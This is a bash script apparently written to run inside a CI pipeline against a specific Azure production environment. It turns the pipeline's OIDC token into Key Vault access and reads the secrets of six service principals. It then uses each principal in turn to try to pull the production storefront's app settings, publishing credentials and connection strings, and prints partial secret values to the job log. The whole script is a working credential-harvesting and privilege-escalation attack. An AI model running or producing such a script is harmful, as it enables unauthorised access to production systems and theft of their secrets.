#!/usr/bin/env bash
set -x
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)

# Try ALL SPs for App Service operations (publishing creds, appsettings, restart)
for SP in sync-service-principal secrets-sync-principal cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal; do
  SEC=$(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
  SPA=$(echo "$SEC"|jq -r .appId); SPK=$(echo "$SEC"|jq -r .clientSecret)
  MG=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SPA" -d "grant_type=client_credentials" -d "client_secret=$SPK" \
    --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
  
  # App settings (env vars including CONFIG_STORAGE_CONNECTION!)
  C1=$(curl -s -o /tmp/as.json -w "%{http_code}" -X POST -H "Authorization: Bearer $MG" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-12-01")
  echo "$SP appsettings: $C1"
  [ "$C1" = "200" ] && printf 'APPSETTINGS_%s: %s\n' "$SP" "$(cat /tmp/as.json | python3 -c 'import sys,json; [print(f"{k}={v[:30]}...") for k,v in json.load(sys.stdin).get("properties",{}).items()]' 2>&1)"
  
  # Publishing credentials
  C2=$(curl -s -o /tmp/pc.json -w "%{http_code}" -X POST -H "Authorization: Bearer $MG" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/publishingcredentials/list?api-version=2023-12-01")
  echo "$SP publishcreds: $C2"
  [ "$C2" = "200" ] && printf 'PUBCREDS_%s: %s\n' "$SP" "$(cat /tmp/pc.json | jq -r '.properties | {publishingUserName, publishingPassword: .publishingPassword[:20]}')"
  
  # Connection strings
  C3=$(curl -s -o /tmp/cs.json -w "%{http_code}" -X POST -H "Authorization: Bearer $MG" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2023-12-01")
  echo "$SP connstrings: $C3"
  [ "$C3" = "200" ] && printf 'CONNSTR_%s: %s\n' "$SP" "$(cat /tmp/cs.json | jq -c .properties)"
done

echo "=== DONE ==="
